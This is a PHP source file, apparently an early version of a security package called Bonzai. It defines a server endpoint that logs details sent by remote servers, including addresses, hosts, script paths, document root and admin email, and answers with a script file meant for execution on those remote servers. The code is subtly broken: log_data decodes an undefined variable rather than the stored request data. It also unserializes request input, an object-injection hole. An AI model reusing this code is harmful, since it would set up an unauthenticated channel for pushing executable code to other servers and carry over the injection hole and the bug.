<?php
/**
 *
 * BONZAI
 * (was phpGuardian)
 *
 * CODE NAME:      phoenix
 * ENGINE VERSION: 0.1
 * MODULE VERSION: 0.1
 *
 * URL:            http://bonzai.fabiocicerchia.it
 * E-MAIL:         bonzai@fabiocicerchia.it
 *
 * COPYRIGHT:      2006-2011 Bonzai - Fabio Cicerchia. All rights reserved.
 * LICENSE:        MIT or GNU GPL 2
 *                 The MIT License is recommended for most projects, it's simple
 *                 and  easy  to understand and it places almost no restrictions
 *                 on  what  you  can do with Bonzai.
 *                 If  the  GPL  suits  your project better you are also free to
 *                 use Bonzai under that license.
 *                 You   don't  have  to  do  anything  special  to  choose  one
 *                 license  or  the  other  and  you don't have to notify anyone
 *                 which   license   you   are   using.  You  are  free  to  use
 *                 Bonzai  in  commercial  projects  as  long  as  the copyright
 *                 header is left intact.
 *                 <http://www.opensource.org/licenses/mit-license.php>
 *                 <http://www.opensource.org/licenses/gpl-2.0.php>
 **/

/**
 *
 * @category  Security
 * @package   Bonzai
 * @version   0.1
 * @author    Fabio Cicerchia <info@fabiocicerchia.it>
 * @copyright 2006-2011 Bonzai - Fabio Cicerchia. All rights reserved.
 * @license   http://www.opensource.org/licenses/mit-license.php MIT
 * @license   http://www.opensource.org/licenses/gpl-2.0.php     GNU GPL 2
 * @link      http://bonzai.fabiocicerchia.it
 */
class Bonzai_Server
{
    // {{{ PROPERTIES
    /**
     * The content data
     * @access private
     * @var    string
     */
    private $_data;

    /**
     * String format for log
     * @access public
     * @var    string
     *
     * %i  REMOTE_ADDR
     * %h  gethostbyaddr(REMOTE_ADDR)
     * %d  HTTP_HOST
     * %t  strftime(date_format)
     * %s  SCRIPT_FILENAME
     * %r  HTTP_REFERER
     * %ua HTTP_USER_AGENT
     * %se SERVER_SIGNATURE
     * %so SERVER_SOFTWARE
     * %a  SERVER_ADDR
     * %p  SERVER_PORT
     * %dr DOCUMENT_ROOT
     * %e  SERVER_ADMIN
     */
    public $log_format = '[%t] %i %h %d:%s';

    /**
     * Log file
     * @access public
     * @type   string
     */
    public $log_file = '/var/log/bonzai/bonzai.log';

    /**
     * Date format into log_format
     * @access public
     * @var    string
     * see php docs for strftime syntax (http://www.php.net/strftime)
     */
    public $date_format = '%a %d %b %Y %H:%M:%S';

    /**
     * Script for execution on remote servers
     * @access public
     * @var    string
     */
    public $exec_file = '/home/fabio/www/bonzai.exec';

    /**
     * Content of execution script
     * @access private
     * @var    sting
     */
    private $_exec_file_content;
    // }}}

    // {{{ METHODS
    // {{{ function __construct
    /**
     * Constructor (PHP5)
     * @access public
     * @param  string $data
     * @return void
     */
    public function __construct($data = '')
    {
        $this->_data = $data;

        if (file_exists($this->exec_file)) {
            $this->_exec_file_content = file_get_contents($this->exec_file);
        }
    }
    // }}}

    // {{{ function log_data
    /**
     * Process the request, save a line of log and if available send the execution script
     * @access public
     * @return string
     */
    public function log_data()
    {
        $param = base64_decode($param);

        $param_arr = @unserialize($param);

        $placeholder['%i']  = $this->getValue($param_arr, 'REMOTE_ADDR');
        $placeholder['%h']  = !empty($param_arr['REMOTE_ADDR']) ? @gethostbyaddr($param_arr['REMOTE_ADDR']) : 'N/A';
        $placeholder['%d']  = $this->getValue($param_arr, 'HTTP_HOST');
        $placeholder['%t']  = @strftime($this->date_format);
        $placeholder['%s']  = $this->getValue($param_arr, 'SCRIPT_FILENAME');
        $placeholder['%r']  = $this->getValue($param_arr, 'HTTP_REFERER');
        $placeholder['%ua'] = $this->getValue($param_arr, 'HTTP_USER_AGENT');
        $placeholder['%se'] = $this->getValue($param_arr, 'SERVER_SIGNATURE');
        $placeholder['%so'] = $this->getValue($param_arr, 'SERVER_SOFTWARE');
        $placeholder['%a']  = $this->getValue($param_arr, 'SERVER_ADDR');
        $placeholder['%p']  = $this->getValue($param_arr, 'SERVER_PORT');
        $placeholder['%dr'] = $this->getValue($param_arr, 'DOCUMENT_ROOT');
        $placeholder['%e']  = $this->getValue($param_arr, 'SERVER_ADMIN');

        $string = $this->log_format;
        foreach($placeholder as $key => $value) $string = str_replace($key, $value, $string);

        $fp = fopen($this->log_file, 'a');
        fwrite($fp, $string . PHP_EOL);
        fclose($fp);

        return $this->_exec_file_content;
    }
    // }}}

    // {{{ function getValue
    /**
     *
     * @access protected
     * @param  array     $param_arr
     * @param  array     $key
     * @return mixed
     */
    protected function getValue($param_arr, $key)
    {
        return !empty($param_arr[$key]) ? $param_arr[$key] : 'N/A';
    }
    // }}}
    // }}}
}

/**
 * Process the request
 */
if (isset($_GET['pc'])) {
    $bonzai_server = new Bonzai_Server(strip_tags($_GET['pc']));

    if (isset($_GET['op'])) {
        switch(strip_tags($_GET['op'])) {
            case "log":
                echo $bonzai_server->log_data();
                break;
        }
    }
}
